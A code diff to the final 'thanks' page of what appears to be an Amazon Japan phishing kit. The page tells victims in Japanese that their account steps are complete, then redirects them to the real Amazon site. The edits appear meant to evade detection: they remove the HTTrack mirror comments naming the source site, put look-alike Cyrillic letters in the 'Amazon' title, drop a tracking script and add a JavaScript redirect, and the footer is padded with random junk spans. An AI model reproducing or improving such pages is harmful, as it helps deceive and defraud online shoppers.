@@ -1,23 +1,19 @@
 <!DOCTYPE html>
 <html lang="en">
-
-<!-- Mirrored from cfptd.com/8a47481ae534860850adf59f145e6b40/thanks.php?udm_cat_path=433df879a6125032b1fe56e3a5ae28bc6fae73fc by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 21 Jul 2020 09:03:05 GMT -->
-<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta http-equiv="X-UA-Compatible" content="ie=edge">
     <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
-    <span style="font-size:18px;">   </span><span style="font-size:24px;"><meta http-equiv="refresh" content="3;URL=https://www.amazon.co.jp/gp/css/homepage.html/ref=nav_youraccount_ya"> </span>
     <link rel="stylesheet" href="library/bootstrap/css/main.min.css">
     <link rel="stylesheet" href="library/fontawesome/css/fontawesome-all.min.css">
     <link rel="stylesheet" href="sheets/index.css">
     <link rel="stylesheet" href="sheets/thanks.css">
     <link rel="shortcut icon" href="assets/img/favicon.ico" />
-    <title>Congratulations - Amazon</title>
+    <title>Congratulations - Amаzоn</title>
 </head>
 <body>
-    <!-- Logo Navbar-->
     <a href="#" class="navbrand text-center mt-3">
         <span class="aicon alogo"></span>
     </a>
@@ -32,7 +28,7 @@
             
                 <p class="text-center thankstext">これで、必要な手順をすべて完了したため、アカウントにアクセスできます。</p>
 
-                <a href="https://www.amazon.co.jp/gp/css/homepage.html/ref=nav_youraccount_ya"><button type="submit" class="btn bgcolored mt-6px">終了</button></a>
+                <button  id="kiddbtn1" class="btn bgcolored mt-6px">終了</button>
           
             </div>
         </div>
@@ -54,13 +50,13 @@
         </ul>
         <p class="footertext text-center"><link href="css/login/VlRqo.css" rel="stylesheet" type="text/css"><span class="fiOqu"></span><span class="qTHBx"></span><span class="eBMwI"></span><span class="pAfFa"></span><span class="yCVOj"></span><span class="AlPXp"></span><span class="WGzFZ"></span><span class="ObCdX"></span><span class="tPZcd"></span><span class="kMEsP"></span><span class="JlPCw"></span><span class="RYLhs"></span><span class="PbVEs"></span><span class="UsBVm"></span><span class="agkUR"></span><span class="JQqYo"></span><span class="FPxza"></span><span class="TvIHn"></span><span class="HZvYi"></span><span class="sNknQ"></span><span class="sDFTQ"></span><span class="sNJFQ"></span><span class="sRTYU"></span><span class="sMMMM"></span><span class="IrQXV"></span><span class="FeAWa"></span><span class="gqZAb"></span><span class="vsikN"></span><span class="vlzCo"></span><span class="LHBcD"></span><span class="UrWBF"></span><span class="egjHo"></span><span class="trITE"></span><span class="DwBqc"></span><span class="ZwLqD"></span><span class="lxPeS"></span><span class="aFZSQ"></span><span class="DMhLd"></span><span class="NpyVu"></span><span class="LjcHx"></span><span class="cdbfJ"></span><span class="WSUuq"></span><span class="geaQK"></span><span class="Natxr"></span><span class="kWDJP"></span><span class="VxfEC"></span><span class="JMepG"></span><span class="spZkP"></span></p>
     </div>
-    <div style="display:none;"><script type='text/javascript' src='https://s4.cnzz.com/z_stat.php?id=1278854177&amp;web_id=1278854177'></script></div>
     <script src="library/jquery/main.min.js"></script>
     <script src="library/pooper/main.min.js"></script>
     <script src="library/bootstrap/js/main.min.js"></script>
-    	
-
+<script>
+    $("#kiddbtn1").click(function () {
+        window.location.href = 'https://www.amazon.co.jp/gp/css/homepage.html/ref=nav_youraccount_ya';
+    })
+</script>
 </body>
-
-<!-- Mirrored from cfptd.com/8a47481ae534860850adf59f145e6b40/thanks.php?udm_cat_path=433df879a6125032b1fe56e3a5ae28bc6fae73fc by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 21 Jul 2020 09:03:13 GMT -->
 </html>
